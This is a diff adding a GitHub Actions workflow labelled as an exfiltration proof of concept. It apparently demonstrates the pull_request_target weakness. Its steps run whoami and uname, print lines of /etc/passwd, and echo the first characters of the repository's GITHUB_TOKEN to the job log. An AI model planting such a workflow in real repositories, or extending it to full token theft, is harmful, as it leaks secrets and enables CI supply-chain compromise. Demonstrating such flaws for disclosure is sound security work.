@@ -1,0 +1,22 @@
+name: PoC — Exfiltration Test
+
+on:
+  pull_request_target:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print system info
+        run: |
+          echo "[+] Whoami output:"
+          whoami
+          echo "[+] System info:"
+          uname -a
+          echo "[+] /etc/passwd contents:"
+          cat /etc/passwd | head -n 10  # only show first 10 lines for proof
+
+      - name: Print token (obfuscated)
+        run: |
+          echo "[+] GitHub token starts with:"
+          echo "${{ secrets.GITHUB_TOKEN }}" | cut -c1-4
